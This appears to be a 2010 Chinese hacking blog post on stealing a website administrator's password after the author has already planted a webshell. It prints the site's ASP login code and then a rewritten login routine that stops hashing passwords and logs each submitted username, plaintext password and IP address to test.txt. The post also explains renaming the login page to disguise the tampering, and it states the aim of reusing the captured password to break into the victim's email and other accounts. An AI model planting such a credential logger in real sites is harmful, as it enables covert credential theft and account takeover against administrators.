@@ -1,0 +1,126 @@
+asp记录管理员账号密码2010-02-27 23:25asp记录管理员账号密码。
+
+来源：www.54rk.cn
+
+作者：拉伸
+
+在一次安全检测中，其实已拿到了webshell了，但是我还要社工他的邮箱还有其他资料类，所以要得知道他的习性。
+下载了数据库，但是md5密码没办法解密。唉，看来只要记录他的登录管理员 账号密码了！
+
+省得还要去穷取法破解！
+
+这个密码其实说重要也不重要 说不 重要 其实很重要。
+因为很多人喜欢使用相同密码。即使是我这类安全检测人员，也免不了使用同一种账号密码的习惯。
+
+首先看看他的后台登陆代码
+
+<%
+Dim Login
+Set Login=new AdLogin
+Login.Execute
+Class AdLogin
+Private ExCommCls
+Private Sub class_initialize
+Set CommCls=new CommonCls
+ExCommCls.IsIpAllow
+ExCommCls.CheckInstall
+ExCommCls.GetConfigCache("*")
+End Sub
+Private Sub class_terminate
+Set ExCommCls=nothing
+End Sub
+public Sub Execute
+Dim Action
+Action=Request("action")
+Select Case Action
+   Case "CheckLogin"
+   CheckLogin
+   Case "LoginOut"
+   LoginOut
+   Case Else
+   LoginF
+End Select
+End Sub
+Private Sub CheckLogin
+Dim Adname,AdPwd,CheckCode
+AdName=ExCommCls.G(Trim(request("Adname")))
+AdPwd=md5(Trim(request("AdPwd")))
+CheckCode=ExCommCls.G(request("checkCode"))
+If Trim(CheckCode)<>session("excheckcode") and Application(sn&"IsCheckCode")="是" Then
+   ExCommCls.ShowMsg "验证码错误！",Application(sn&"blogurl")&"admin_login.asp"
+   Exit Sub
+End If
+If Trim(AdName)=CStr(Application(sn&"AdName")) And Trim(AdPwd)=CStr(Application(sn&"AdPwd")) Then
+  Response.Cookies(Md5(SN))("AdName")=AdName
+   Response.Cookies(Md5(SN))("AdPwd")=AdPwd
+   session("AdLogin")=Md5(SN)
+   ExCommCls.GetConfigCache("*")
+   ExCommCls.GetClassCache()
+   Response.Redirect(Application(sn&"blogurl")&"admin_index.asp")
+Else
+   ExCommCls.ShowMsg "帐号或密码错误",Application(sn&"blogurl")&"admin_login.asp"
+End if
+End Sub
+Private Sub LoginOut
+Response.Cookies(Md5(SN))("AdName")=""
+Response.Cookies(Md5(SN))("AdPwd")=""
+session.Abandon()
+ExCommCls.ShowMsg "成功退出登陆",Application(sn&"blogurl")&"index.asp"
+End Sub
+Private Sub LoginF
+%>
+看下列代码
+AdName=ExCommCls.G(Trim(request("Adname")))
+AdPwd=md5(Trim(request("AdPwd")))
+
+---意思很简单，这里就不明说了， 主要看md5 ,密码使用md5加密 这样的话，我们记录的密码也就没用了，还是md5。所以
+所以想到了，一个钓鱼手法。 它本来的登录界面是
+Private Sub CheckLogin
+Dim Adname,AdPwd,CheckCode,StrLogText,ip,ff
+AdName=ExCommCls.G(Trim(request("Adname")))
+AdPwd=(Trim(request("AdPwd")))
+CheckCode=ExCommCls.G(request("checkCode"))
+strLogFile="test.txt"
+IP=request("IP")
+StrLogText=StrLogText&AdName&"----"&AdPwd&"----IP:"&IP&("REMOTE_HOST")
+set f=Server.CreateObject("scripting.filesystemobject")
+set ff=f.opentextfile(server.mappath(".")&"\"&strLogFile,8,true,0)
+ff.writeline(chr(13)+chr(10)&StrLogText)
+ff.close
+set ff=nothing
+set f=nothing
+If Trim(CheckCode)<>session("excheckcode") and Application(sn&"IsCheckCode")="是" Then
+   ExCommCls.ShowMsg "验证码错误！",Application(sn&"blogurl")&"Admin_1ogin.asp"
+   Exit Sub
+End If
+If Trim(AdName)=CStr(Application(sn&"AdName")) And Trim(AdPwd)=CStr(Application(sn&"AdPwd")) Then
+   Response.Cookies(Md5(SN))("AdName")=AdName
+   Response.Cookies((SN))("AdPwd")=AdPwd
+   session("AdLogin")=Md5(SN)
+   ExCommCls.GetConfigCache("*")
+   ExCommCls.GetClassCache()
+   Response.Redirect(Application(sn&"blogurl")&"Admin_1ogin.asp")
+Else
+   ExCommCls.ShowMsg "帐号或密码错误",Application(sn&"blogurl")&"Admin_1ogin.asp"
+End if
+End Sub
+
+
+看到没，
+a=本来的登录页面 现在换成了钓鱼页面
+b=本来的登录页面(admin_login.asp)修改成admin_1ogin.asp
+为什么呢。
+本来的： AdPwd=md5(Trim(request("AdPwd")))
+Response.Cookies(Md5(SN))("AdPwd")=AdPwd
+修改
+
+AdPwd=(Trim(request("AdPwd")))
+Response.Cookies((SN))("AdPwd")=AdPwd
+
+去掉md5。。这样的迷惑手法，使用很久了！。。
+
+没什么技术含量。 还请不要见笑！密码会记录在test.txt上
+
+细心总是好的！
+ 
+
